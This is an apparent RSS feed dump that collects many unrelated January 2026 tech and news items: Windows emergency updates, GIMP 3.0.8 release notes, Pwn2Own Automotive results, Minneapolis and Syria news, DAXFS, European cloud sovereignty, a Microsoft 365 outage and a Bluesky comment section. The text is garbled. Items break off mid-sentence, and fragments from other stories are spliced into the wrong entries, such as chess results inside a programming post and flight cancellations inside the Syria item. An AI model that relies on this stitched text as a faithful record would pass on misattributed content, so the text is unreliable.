The botched update has already forced the company to issue one emergency out of band update to fix two major issues, and now a second emergency out of band update has been released to address another critical problem."An out-of-band (OOB) update was released today, January 24, 2026, to address this issue," Microsoft says in newly published documentation. "This cumulative update includes all protections and improvements from the January 2026 Windows security update released January 13, 2026, as well as from the OOB update released on January 17, 2026 (which introduced fixes for two known issues: remote desktop connectionsHere's the official changelog for the KB5078127 update from Microsoft:Fixed: After installing the Windows update released on and after January 13, 2026, some applications became unresponsive or encountered unexpected errors when opening files from or saving files to cloud-based storage, such as OneDrive or Dropbox. In certain Outlook configurations that store PST files on OneDrive, Outlook may hang and fail to reopen unless the process is terminated or the system is restarted. Users may also see missing sent Items or previously downloaded emails being re‑downloaded.This same fix is being rolled out to various other versions and editions of Windows too, including Windows 11 version 23H2, Windows Server editions, and more. Be sure to check out the Windows release health dashboard for the latest information impacting your version of Windows.This is the second emergency out of band update that Microsoft has pushed out for Windows 11 users in a week. The first arrived on January 17, and fixed two major issues that began appearing for users after installing this month's Patch Tuesday updates released on January 13.The original Patch Tuesday release introduced an issue that caused PCs running version 23H2 to fail to shutdown or hibernate, and also broke signing into Windows 11 PCs using Remote Desktop. Microsoft addressed these issues in the out of band update issued on January 17, but in the process broke apps like Outlook, OneDrive, and Dropbox.It's clear that the quality bar for Windows is at an all time low right now, marking an absolutely dreadful start to the year for Microsoft and Windows. It feels like there's nowhere to go but up at this point, so hopefully things improve with the next Patch Tuesday release.]]></content:encoded></item><item><title>Davos: G42 CEO Peng Xiao on UAE Chip Imports, AI Developments</title><link>https://www.youtube.com/watch?v=wcz7luRGzXs</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/wcz7luRGzXs?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 03:01:07 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[G42 CEO Peng Xiao discusses building AI infrastructure, evolving government approaches to regulation, the UAE’s role in global AI development, the Stargate project, and chip imports amid existing restrictions.

As we close in on the release of  3.2, we wanted to share with you what
may be the last set of bugfixes for  3.0.Micro releases like 3.0.8 are focused on
fixing bugs and regressions. While this news post is not an exhaustive list of all fixes, we wanted to highlight some of the ones
with a more noticeable impact.Improvements in start-up time for users with a large number of fonts was
backported from our 3.2  release.
As a result, we now wait to load images until fonts are initialized - this prevents some occasional odd displays
and other issues when an  file tried to access a partially loaded font.For macOS users, we have special-cased the legacy Skia font, as we received reports that it did not behave properly
with the Pango library we use to render fonts. You should now be able to use all fonts weights instead of just Bold.Assorted updates and fixes helped us identify an issue when exporting a lossless  image could be affected by
lossy settings (such as Quality being less than 100%). We’ve updated our  plug-in to prevent this from happening. fixed a bug in the Windows installer where text would be duplicated in certain languages. diagnosed an issue with font kerning on macOS, which was fixed by .Because of differences in how different operating systems represent file paths, default color profiles
were not being loaded correctly on start-up on Windows. This should now be fixed, though you may need to
reassign your default color profiles in Preferences to clear out the older, incorrect file path.Thanks to ‘s efforts, the standard  executable can now be run with a  flag 
instead of requiring users to call  even on devices with no display. The 
flag is now visible as well. improved our flatpak by adding safe guards to show the correct configuration directory
regardless of whether  is defined on the user’s system. This should make it much easier for
flatpak users to install and use third party plug-ins.We fixed a rare but possible crash when using the Equalize filter on images with
 values. Images that contain these are usually created from scientific
or mapping data, so you’re unlikely to come across them in standard editing. fixed an internal issue where the wrong version number could be used when installing
minor releases (such as the 3.2 release candidates and upcoming 3.2 stable release).As noted in our 3. news post,
we have updated our  import code to improve the rendered path.Further improvements have been made to our non-destructive filter code to improve stability, especially
when copying and pasting layers and images with filters attached to them. Some issues related to applying
 filters on Quick Masks have also been corrected.An unintended Search pop-up that appeared when typing while the Channels dockable was selected has been
turned off.When saving XCFs for  2.10 compatibility, we unintentionally saved Grid color using the new color format.
This caused errors when reopening the  in 2.10. This problem has now been fixed! If you encounter any other
 incompatibility, please let us know.The Navigation and Selection Editor dockables no longer show a large bright texture when no image is actively selected.
This was especially noticeable on dark themes.When a layer has no active filters, the  column had the same “checkbox” outline when hovered over as the lock column.
This led to confusion about clicking it to add filters. We have removed the outline on hover as a small step to help address this. fixed alignment and cut-off issues with the buttons on our Transform tool overlays. All buttons should now
be properly centered and visible.The options for filling layers with colors when resizing the canvas will be turned off when not relevant (such as when you set
layers to not be resized).More  elements such as dialog header icons will now respond to your icon size preferences. has continued his work to update our  with the more usable Spin Scale widget. He has
also updated the widget itself to improve how it works for users and developers alike. and  continued to patch potential security issues related to some of
our file format plug-ins. In addition to existing fixes 
mentioned in the release candidate news posts,
the following exploits are now prevented:Another potential issue related to  files with incorrect metadata was reported by . It does not have a
 number yet, but it has been fixed for  3.0.8.  also fixed a potential issue
with loading Creator blocks in Paintshop Pro  images.As part of  3.0.8, we also updated several dependencies to prevent vulnerabilities. Thanks to ,
our Windows installer now uses a newer version of Python due to several CVEs in Python 3.12.11. We also updated
our  library librsvg 2.61.3 to prevent a possible  authentication exploit when loading a malicious .For plug-in and script developers, a few new public s 
were backported to  3.0.8. gimp_cairo_surface_get_buffer () allows you to retrieve a  buffer from a 
Cairo surface (such as a text layer). Note that this deprecates gimp_cairo_surface_create_buffer ().gimp_config_set_xcf_version () and gimp_config_get_xcf_version () can be used to specify a particular  version for
a configuration. This will allow you to have that data serialized/deserialized for certain versions of  if there were
differences (such as the Grid colors mentioned above).Fixes were made for retrieving image metadata via scripting.  is now a visible child of , so you
can use standard gexiv2 functions to retrieve information from it.Original thumbnail metadata is also now removed on export to prevent potential issues when exporting into a new format.Packaging improvements on macOS and  worked on some packaging fixes for macOS:Image Graph is now available (if  is run with )Thai language interfaces have proper word breaking and  files can be opened againDialogs should receive focus again thanks to a patch on  icon is not tiny anymore on macOS 26 Tahoe (we plan to support Liquid Glass effects in the future)Configuration migrations between  2.10 and 3.0 should be more robust now.Our documentation maintainer  has released a new version of the  3.0 help manual.
Version 3.0.2 of the manual includes updated information on non-destructive filters, changes in the Align tool, and more.
Updates to fifteen translations have been made as part of this release.Special thanks to  for their work in standardizing formatting across the help manual and reducing the need to
retranslate duplicate text. has released a new update for babl, our color space engine. Version 0.1.120 adds support for the
x86_64-v4 microarchitecture for code optimizations.26 reports were closed as .12 translations were updated: Chinese (China), Danish, Georgian, Greek, Lithuanian, Norwegian Nynorsk, Persian, Slovenian, Swedish, Thai, Turkish, Ukrainian.28 people contributed changes or fixes to  3.0.8 codebase (order

various discussion channels or social
network accounts such as Ville Pätsi, Liam Quin, Michael Schumacher and Sevenix!Note: considering the number of parts in  and around, and how we
get statistics through  scripting, errors may slip inside these
stats. Feel free to tell us if we missed or mis-categorized some
contributors or contributions.Linux AppImages for x86 and  (64-bit)Linux Flatpaks for x86 and  (64-bit)Linux Snaps for x86 and  (64-bit)Universal Windows installer for x86 (32 and 64-bit) and for  (64-bit)Microsoft Store for x86 and  (64-bit)macOS  packages for Intel/x86 and Apple/ hardware (64-bit)Other packages made by third-parties are obviously expected to follow (Linux or * distributions’ packages, etc).This might be the final release in the  3.0 series, unless some very
ugly bug were to appear and we’d feel like making a better ending. We
know indeed that some people are sometimes stuck longer on some series
for various reasons (such as stable package policy in some Linux
distributions, or because we do have to drop some platforms sometimes —
which will soon be the case for 32-bit Windows by the way! —, and
sometimes some people just prefer older !). Also we do introduce
bugs with new feature code. Such is the life of software, either being
stale and stabler, or evolving with higher risk of new bugs!So whatever your reason, let’s make sure that you’ll have at least a
very nice latest 3.0 build to get back too, if needed be. 😄Now we are mostly focusing on the last few issues before starting the
3.2 series. We’ll get news about this soon.In any case, we wish you all a very happy new Western year! May it be
filled with a lot of joy, fun with  too, and of course a healthy
life. 🤗]]></content:encoded></item><item><title>Infotainment, EV Charger Exploits Earn $1M at Pwn2Own Automotive 2026</title><link>https://it.slashdot.org/story/26/01/25/0131222/infotainment-ev-charger-exploits-earn-1m-at-pwn2own-automotive-2026?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>tech</category><pubDate>Sun, 25 Jan 2026 02:34:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[Trend Micro's Zero Day Initiative sponsored its third annual Pwn2Own Automotive competition in Tokyo this week, receiving 73 entries, the most ever for a Pwn2Own event. 

"Under Pwn2Own rules, all disclosed vulnerabilities are reported to affected vendors through ZDI," reports Help Net Security, "with public disclosure delayed to allow time for patches."

Infotainment platforms from Tesla, Sony, and Alpine were among the systems compromised during demonstrations. Researchers achieved code execution using techniques that included buffer overflows, information leaks, and logic flaws. One Tesla infotainment unit was compromised through a USB-based attack, resulting in root-level access. Electric vehicle charging infrastructure also received significant attention. Teams successfully demonstrated exploits against chargers from Autel, Phoenix Contact, ChargePoint, Grizzl-E, Alpitronic, and EMPORIA. Several attacks involved chaining multiple vulnerabilities to manipulate charging behavior or execute code on the device. These demonstrations highlighted how charging stations operate as network-connected systems with direct interaction with vehicles. 

There's video recaps on the ZDI YouTube channel — apparently the Fuzzware.io researchers "were able to take over a Phoenix Contact EV charger over bluetooth." 

Three researchers also exploited the Alpitronic's HYC50 fast-charging with a classic TOCTOU bug, according to the event's site, "and installed a playable version of Doom to boot." They earned $20,000 — part of $1,047,000 USD was awarded during the three-day event. 
More coverage from SecurityWeek:

The winner of the event, the Fuzzware.io team, earned a total of $215,500 for its exploits. The team received the highest individual reward: $60,000 for an Alpitronic HYC50 EV charger exploit delivered through the charging gun. ZDI described it as "the first public exploit of a supercharger".]]></content:encoded></item><item><title>Minneapolis: Slain man was a lawful gun owner with a permit to carry, says police chief | DW News</title><link>https://www.youtube.com/watch?v=EmY7s8si7qg</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/EmY7s8si7qg?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 02:16:55 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[A man has died after being shot by federal agents in Minneapolis. The Department of Homeland Security says the man approached the officers carrying a firearm -- and resisted being disarmed. 

The incident comes less than three weeks after the fatal shooting of Renee Good, which sparked protests across the city. Thousands of Immigration and Customs Enforcement -- or ICE -- agents have been deployed to the city as President Donald Trump intensifies his nationwide campaign to deport immigrants. 

Minneapolis authorities later held a press conference in which mayor Jacob Frey said he had requested assistance from the national guard to help support the city police force as it tries to keep the peace.

Also, repositories need to be sync. ]]></content:encoded></item><item><title>Two Weeks Until Tapeout</title><link>https://essenceia.github.io/projects/two_weeks_until_tapeout/</link><author>client4</author><category>hn</category><pubDate>Sun, 25 Jan 2026 01:25:37 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Connection Exhaustion in High-Traffic Systems</title><link>https://open.substack.com/pub/systemdr/p/connection-exhaustion-in-high-traffic?utm_source=share&amp;amp;utm_medium=android&amp;amp;r=5bgzxg</link><author>/u/Extra_Ear_10</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 00:57:55 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>DAXFS Proposed As Newest Linux File-System</title><link>https://www.phoronix.com/news/DAXFS-Linux-File-System</link><author>/u/anh0516</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 00:47:18 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[
There's yet another new Linux file-system on the block: DAXFS has been announced as a new read-only open-source file-system.
DAXFS as implied by the name makes use of the Linux kernel's direct access "DAX" infrastructure. DAX is designed as a simple read-only file-system operating directly atop shared physical memory.
DAXFS is designed to provide zero-copy reads from contiguous memory regions and bypasses the traditional block I/O stack, buffer heads, and page cache entirely -- a big difference compared to the likes of RAMFS or TMPFS.
DAXFS is designed for zero-copy efficiency, true physical sharing, hardware integration with the likes of GPUs and CXL hardware, and simplicity:
"Key Features
- Zero-Copy Efficiency: File reads resolve to direct memory loads, eliminating page cache duplication and CPU-driven copies.
- True Physical Sharing: By mapping a contiguous physical address or a dma-buf, multiple kernel instances or containers can share the same physical pages.
- Hardware Integration: Supports mounting memory exported by GPUs, FPGAs, or CXL devices via the dma-buf API.
- Simplicity: Uses a self-contained, read-only image format with no runtime allocation or complex device management."DAXFS is being developed by Multikernel.io, the developers behind a proposed multi-kernel architecture for Linux. As part of their DAXFS work they aim to enhance their multi-kernel efforts as well as enhancing CXL support and better accelerator data handling:
"Primary Use Cases
- Multikernel Environments: Sharing a common Docker image across independent kernel instances via shared memory.
- CXL Memory Pooling: Accessing read-only data across multiple hosts without network I/O.
- Container Rootfs Sharing: Using a single DAXFS base image for multiple containers (via OverlayFS) to save physical RAM.
- Accelerator Data: Zero-copy access to model weights or lookup tables stored in device memory."DAXFS was announced today on the Linux Kernel Mailing List. The current DAXFS kernel module and user-space tool for it can currently be found on GitHub while awaiting to see the level of upstream interest in potentially working toward upstreaming it into the mainline Linux kernel.]]></content:encoded></item><item><title>Wine-Staging 11.1 Adds Patches For Enabling Recent Adobe Photoshop Versions On Linux</title><link>https://www.phoronix.com/news/Wine-Staging-11.1</link><author>Michael Larabel</author><category>tech</category><pubDate>Sun, 25 Jan 2026 00:33:41 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Following yesterday's release of Wine 11.1 for kicking off the new post-11.0 development cycle, Wine-Staging 11.1 is now available for this experimental/testing version of Wine that present is around 254 patches over the upstream Wine state...]]></content:encoded></item><item><title>NVIDIA’s real moat isn’t hardware, it’s 4 million developers</title><link>https://medium.com/@jpcaparas/nvidias-real-moat-isn-t-hardware-it-s-4-million-developers-648d6aeb1226?sk=82ee7baf9290da1eb93efd9d34c4c7b4</link><author>/u/jpcaparas</author><category>ai</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 00:24:09 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: C From Scratch – Learn safety-critical C with prove-first methodology</title><link>https://github.com/SpeyTech/c-from-scratch</link><author>william1872</author><category>hn</category><pubDate>Sun, 25 Jan 2026 00:17:07 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[Seven modules teaching C the way safety-critical systems are actually built: MATH → STRUCT → CODE → TEST.Each module answers one question: Does it exist?

with Hans Moke Niemann. 

Anish Giri beat World Champion Gukesh who was probably still
unstable after his shocking Round 6 blunder. Teenager
Yagiz Kaan Erdogmus moved into a share of third with an
impressive win against Arjun Erigaisi. 
Thai Dai Van Nguyen drew with Vladimir Fedoseev and

Expect Top Talent Turnover, Culture Rot</title><link>https://it.slashdot.org/story/26/01/24/2146216/work-from-office-mandate-expect-top-talent-turnover-culture-rot?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>tech</category><pubDate>Sat, 24 Jan 2026 23:34:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[CIO magazine reports that "the push toward in-person work environments will make it more difficult for IT leaders to retain and recruit staff, some experts say."

"In addition to resistance, there would also be the risk of talent turnover," [says Lawrence Wolfe, CTO at marketing firm Converge]... "The truth is, both physical and virtual collaboration provide tremendous value...." IT workers facing work-from-office mandates are two to three times more likely than their counterparts to look for new jobs, according to Metaintro, a search engine that tracks millions of jobs. IT leaders hiring new employees may also face significant headwinds, with it taking 40% to 50% longer to fill in-person roles than remote jobs, according to Metaintro. "Some of the challenges CIOs face include losing top-tier talent, limiting the pool of candidates available for hire, and damaging company culture, with a team filled with resentment," says Lacey Kaelani, CEO and cofounder at Metaintro... 


There are several downsides for IT leaders to in-person work mandates, [adds Lena McDearmid, founder and CEO of culture and leadership advisory firm Wryver], as orders to commute to an office can feel arbitrary or rooted in control rather than in value creation. "That erodes trust quickly, particularly in IT teams that proved they could deliver remotely for years," she adds. The mandates can also create new friction for IT leaders by requiring them to deal with morale issues, manage exceptions, and spend time enforcing policy instead of leading strategy, she says. "There's also a real risk of losing experienced, high-performing talent who have options and are unwilling to trade autonomy for proximity without a clear reason," McDearmid adds. "When companies mandate daily commutes without a clear rationale, they often narrow their talent pool and increase attrition, particularly among people who know they can work effectively elsewhere." 

McDearmid has seen teams "sitting next to each other" who collaborate poorly "because decisions are unclear or leaders equate visibility with progress... Collaboration doesn't automatically improve just because people share a building." 

And Rebecca Wettemann, CEO at IT analyst firm Valoir, warns of return-to-office mandates "being used as a Band-Aid for poor management. When IT professionals feel they're being evaluated based on badge swipes, not real accomplishments, they will either act accordingly or look to work elsewhere."

One or two members have strong Kubernetes experience from software engineering roles, while the rest of us (including me) come from data/IT backgrounds with an interest in AI. For the project, we’re deploying a simple backend application on a local Kubernetes cluster and intentionally triggering common failures like CrashLoopBackOff, ImagePullBackOff, and OOMKilled, then evaluating how helpful the LLM-generated explanations actually are.we’re not training models, not building agents, and not doing autonomous remediation. We’re only using pre-trained generative AI models in inference mode to analyse existing Kubernetes outputs (logs, events, pod descriptions). The models will be served locally using Ollama, and we’re keeping the setup lightweight (e.g. k3s, kind, or minikube).I’d really like to hear from people with hands-on Kubernetes experience:Have you seen generative AI tools actually help with Kubernetes troubleshooting?Where do you think LLMs add value, and where do they fall short?Any open-source models you’d recommend for analysing logs and events?We’re considering using RAG (feeding in kubectl outputs or docs) to reduce hallucinations , does that make sense in practice?Any advice, pitfalls, or lessons learned would be appreciated.

Payment systems in your local food store go down. Healthcare systems in the regional hospital flatline. Your work software tools, and all the information they contain, disappear.You reach out for information but struggle to communicate with family and friends, or to get the latest updates on what is happening, as social media platforms are all down. Just as someone can pull the plug on your computer, it’s possible to shut down the system it connects to. This isn’t an outlandish scenario. Technical failures, cyber-attacks and natural disasters can all bring down key parts of the internet. And as the US government makes increasing demands of European leaders, it is possible to imagine Europe losing access to the digital infrastructure provided by US firms as part of the geopolitical bargaining process. At the World Economic Forum in Davos, Switzerland, the EU’s president, Ursula von der Leyen, has highlighted the “structural imperative”  for Europe to “build a new form of independence” – including in its technological capacity and security. And, in fact, moves are already being made across the continent to start regaining some independence from US technology.A small number of US-headquartered big tech companies now control a large proportion of the world’s cloud computing infrastructure, that is the global network of remote servers that store, manage and process all our apps and data. Amazon Web Services (AWS), Microsoft Azure and Google Cloud are reported to hold about 70% of the European market, while European cloud providers have only 15%.My research supports the idea that relying on a few global providers increases vulnerabilty for Europe’s private and public sectors – including the risk of cloud computing disruption, whether caused by technical issues, geopolitical disputes or malicious activity.Two recent examples – both the result of apparent technical failures – were the hours‑long AWS incident in October 2025, which disrupted thousands of services such as banking apps across the world, and the major Cloudflare incident two months later, which took LinkedIn, Zoom and other communication platforms offline. The impact of a major power disruption on cloud computing services was also demonstrated when Spain, Portugal and some of south-west France endured a massive power cut in April 2025.What happens in a digital blackout?There are signs that Europe is starting to take the need for greater digital independence more seriously. In the Swedish coastal city of Helsingborg, for example, a one-year project is testing how various public services would function in the scenario of a digital blackout. Would elderly people still receive their medical prescriptions? Can social services continue to provide care and benefits to all the city’s residents?This pioneering project seeks to quantify the full range of human, technical and legal challenges that a collapse of technical services would create, and to understand what level of risk is acceptable in each sector. The aim is to build a model of crisis preparedness that can be shared with other municipalities and regions later this year.Elsewhere in Europe, other forerunners are taking action to strengthen their digital sovereignty by weaning themselves off reliance on global big tech companies – in part through collaboration and adoption of open source software. This technology is treated as a digital public good that can be moved between different clouds and operated under sovereign conditions.In northern Germany, the state of Schleswig-Holstein has made perhaps the clearest break with digital dependency. The state government has replaced most of its Microsoft-powered computer systems with open-source alternatives, cancelling nearly 70% of its licenses. Its target is to use big tech services only in exceptional cases by the end of the decade.Across France, Germany, the Netherlands and Italy, governments are investing both nationally and transnationally in the development of digital open-source platforms and tools for chat, video and document management – akin to digital Lego bricks that administrations can host on their own terms.In Sweden, a similar system for chat, video and online collaboration, developed by the National Insurance Agency, runs in domestic data centres rather than foreign clouds. It is being offered as a service for Swedish public authorities looking for sovereign digital alternatives.For Europe – and any nation – to meaningfully address the risks posed by digital blackout and cloud collapse, digital infrastructure needs to be treated with the same seriousness as physical infrastructure such as ports, roads and power grids.Control, maintenance and crisis preparedness of digital infrastructure should be seen as core public responsibilities, rather than something to be outsourced to global big tech firms, open for foreign influence.To encourage greater focus on digital resilience among its member states, the EU has developed a cloud sovereignty framework to guide procurement of cloud services – with the intention of keeping European data under European control. The upcoming Cloud and AI Development Act is expected to bring more focus and resources to this area.Governments and private companies should be encouraged to demand security, openness and interoperability when seeking bids for provision of their cloud services – not merely low prices. But in the same way, as individuals, we can all make a difference with the choices we make.Just as it’s advisable to ensure your own access to food, water and medicine in a time of crisis, be mindful of what services you use personally and professionally. Consider where your emails, personal photos and conversations are stored. Who can access and use your data, and under what conditions? How easily can everything be backed up, retrieved and transferred to another service?No country, let alone continent, will ever be completely digitally independent, and nor should they be. But by pulling together, Europe can ensure its digital systems remain accessible even in a crisis – just as is expected from its physical infrastructure.]]></content:encoded></item><item><title>Google says it’s fixed Gmail issues with spam and misclassification</title><link>https://techcrunch.com/2026/01/25/gmail-is-having-issues-with-spam-and-misclassification/</link><author>Anthony Ha</author><category>tech</category><pubDate>Sat, 24 Jan 2026 22:58:00 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[If your Gmail account doesn’t seem to be working properly today, you’re not alone.]]></content:encoded></item><item><title>Syria announces ceasefire extension - What does it mean for the Kurdish people? | DW News</title><link>https://www.youtube.com/watch?v=kzZLdktqiNs</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/kzZLdktqiNs?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 22:55:50 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[Syria's government has announced that it will extend a four-day ceasefire with Kurdish fighters for 15 days. The two sides have been fighting since early January, when Damascus launched an offensive to bring the Kurdish-administered region back under its control. 

Meanwhile, tens of thousands of protesters have marched in cities across Europe in solidarity with the Kurdish people in Syria. In Germany's city of Cologne, 20,000 people took to the streets calling for the protection of civilians. Kurdish people in Syria have accused government troops of attacks on their population after Damascus launched an offensive to bring the Kurdish-administered region back under its control. 

As government forces advanced this week, the Kurds withdrew from the al-Hol camp -- the biggest facility housing relatives of suspected IS members. The fate of the woman and children there now hangs in the balance.

More than 3,500 flights on Saturday were canceled, according to flight tracker FlightAware. Many of Saturday's cancellations were in and out of Dallas Fort Worth International Airport, with about 1,300 scrubbed flights, and at Dallas Love Field, with 186 cancellations, the majority of the schedule at each airport. American Airlines, based in Fort Worth, Texas, had canceled 902 Saturday flights, about 30% of its mainline schedule and Southwest Airlines canceled 571 flights, or 19%, according to FlightAware. 

U.S. flight cancellations nearly doubled to more than 7,000 [now up to 8,947] on Sunday when the storm is expected to hit the mid-Atlantic and Northeast U.S. As of midday on Saturday, most flights from Raleigh-Durham International Airport in North Carolina to Portland, Maine, were canceled. Major airline hubs were affected as far south as Atlanta, where Delta Air Lines is based.... American, Delta, JetBlue Airways, Southwest Airlines, United Airlines and other U.S. carriers said they are waiving change and cancellation fees as well as fare differences to rebook for customers with tickets to and from more than 40 airports around the country. The waivers include restrictive basic economy tickets.

India is put forward as an example. While China's rapid electrification has been hailed as a miracle, by some measures, India is moving ahead faster than China did when it was at similar levels of economic development. It's an indication that clean electricity could be the most direct way to boost growth for other developing economies. 

That's mainly because India has access to solar panels and electric cars at a much lower price than China did about a decade ago. Chinese investments lowered the costs of what experts call "modular technologies" — the production of each solar panel, battery cell and electric car enables engineers to learn how to make it more efficiently. 

The think tank's team even argues "that countries such as India, which don't have significant domestic fossil-fuel reserves, will become 'electrostates' that meet most of their energy needs through electricity generated from clean sources," according to the article:

No country is an electrostate yet, [says Ember strategist Kingsmill Bond], but countries are increasingly turning to green electricity to power their economies. Nations that are less developed than India will see even more advantages as the cost of electricity technologies, from solar panels and electric vehicles to battery components and minerals, continue to fall. 

Neither India nor China is going electric purely to cut emissions or meet climate targets, says Bond. They're doing so because it makes economic sense, particularly for India, which imports more than 40% of its primary energy in the form of coal, oil and gas, according to the International Energy Agency. "To grow and have energy independence, India needs to reduce the terrible burden of fossil-fuel imports worth $150 billion each year," said Bond. "India needs to find other solutions...." 

[I]f countries like India find ways to grow electrotech manufacturing without absolute dependence on Chinese equipment, electrification could speed up further. With the U.S. and Europe continuing to add exclusions for Chinese-linked electrotech, countries like India will have an incentive to invest in their own manufacturing capacity. "We are probably at a moment of peak Chinese dominance in the electrotech system, as the rest of the world starts to wake up and realize that this is the energy future," he said.]]></content:encoded></item><item><title>GateKey - Open Source Zero-Trust VPN with SSO</title><link>https://www.reddit.com/r/kubernetes/comments/1qlzlea/gatekey_open_source_zerotrust_vpn_with_sso/</link><author>/u/jessedye</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 21:32:12 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Poland&apos;s energy grid was targeted by never-before-seen wiper malware</title><link>https://arstechnica.com/security/2026/01/wiper-malware-targeted-poland-energy-grid-but-failed-to-knock-out-electricity/</link><author>Bender</author><category>hn</category><pubDate>Sat, 24 Jan 2026 21:24:13 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Prince Albert - The Obsession of Queen Victoria Documentary</title><link>https://www.youtube.com/watch?v=RQUhZ_UyuSA</link><author>The People Profiles</author><category>yt</category><enclosure url="https://www.youtube.com/v/RQUhZ_UyuSA?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 21:02:59 +0000</pubDate><source url="https://www.youtube.com/channel/UCD6TPU-PvTMvqgzC_AM7_uA">The People Profiles</source><content:encoded><![CDATA[Explore the dramatic true story of Prince Albert, the man who became Queen Victoria’s obsession and reshaped the British monarchy.

But that's down "from over 15,890 reports at its peak a day earlier, according to Downdetector." Reuters points out the outage affected antivirus software Microsoft Defender and data governance software Microsoft Purview, while CRN notes it also impacted "a number of Microsoft 365 services" including Outlook and Exchange online:

During the outage, Outlook users received a "451 4.3.2 temporary server issue" error message when attempting to send or receive email. Users did not have the ability to send and receive email through Exchange Online, including notification emails from Microsoft Viva Engage, according to the vendor. Other issues that cropped up include an inability to send and receive subscription email through [analytics platform] Microsoft Fabric, collect message traces, search within SharePoint online and Microsoft OneDrive and create chats, meetings, teams, channels or add members in Microsoft Teams... 

As with past cloud outages with other vendors, even after Microsoft fixed the issues, recovery efforts by its users to return to a normal state took additional time... Microsoft confirmed in a post on X [Thursday] at 4:14 p.m. ET that it "restored the affected infrastructure to a (healthy) state" but "further load balancing is required to mitigate impact...." The company reported "residual imbalances across the environment" at 7:02 p.m., "restored access to the affected services" and stable mail flow at 12:33 a.m. Jan. 23. At that time, Microsoft still saw a "small number of remaining affected services" without full service stability. The company declared impact from the event "resolved" at 1:29 p.m. Eastern. Microsoft sent out another X post at 8:20 a.m. asking users experiencing residual issues to try "clearing local DNS caches or temporarily lowering DNS TTL values may help ensure a quicker remediation...." 

Microsoft said in an admin center update that [Thursday's] outage was "caused by elevated service load resulting from reduced capacity during maintenance for a subset of North America hosted infrastructure." Furthermore, Microsoft noted that during "ongoing efforts to rebalance traffic" it introduced a "targeted load balancing configuration change intended to expedite the recovery process, which incidentally introduced additional traffic imbalances associated with persistent impact for a portion of the affected infrastructure." US itek's David Stinner said it appears that Microsoft did not have enough capacity on its backup system while doing maintenance on its main system. "It looks like the backup system was overloaded, and it brought the system down while they were still doing maintenance on the main system," he said. "That is why it took so many hours to get back up and running. If your primary system is down for maintenance and your backup system fails due to capacity issues, then it is going to take a while to get your primary system back up and running." 

"This was not Microsoft's first outage of 2026," the article notes, "with the vendor handling access issues with Teams, Outlook and other M365 services on Wednesday, a Copilot issue on Jan. 15 plus an Azure outage earlier in the month..."]]></content:encoded></item><item><title>I added a Bluesky comment section to my blog</title><link>https://micahcantor.com/blog/bluesky-comment-section.html</link><author>hydroxideOH-</author><category>hn</category><pubDate>Sat, 24 Jan 2026 20:33:40 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[You can now view replies to this blog post made on Bluesky directly on this website. Check it out here!I've always wanted to host a comment section on my site, but it's difficult because the content is statically generated and hosted on a CDN.
I could host comments on a separate VPS or cloud service.
But maintaining a dynamic web service like this can be expensive and time-consuming — in general, I'm not interested in being an unpaid, part-time DevOps engineer.Recently, however, I read a blog post by Cory Zue about how he embedded a comment section from Bluesky on his blog.
I immediately understood to benefits of this approach. With this approach, Bluesky could handle all of the difficult work involved in managing a social media like account verification, hosting, storage, spam, and moderation. Meanwhile because Bluesky is an open platform with a public API, it's easy to directly embed comments on my own site.There are other services that could be used for this purpose instead. Notably, I could embed replies from the social media formerly known as Twitter. Or I could use a platform like Disqus or even giscus, which hosts comments on GitHub Discussions. But I see Bluesky as a clearly superior choice among these options. For one, Bluesky is built on top of an open social media platform in AT Proto, meaning it can't easily be taken over by an authoritarian billionaire creep. Moreover, Bluesky is a full-fledged social media platform, which naturally makes it a better option for hosting a conversation than GitHub.Zue published a standalone package called bluesky-comments that allows embedding comments in a React component as he did.
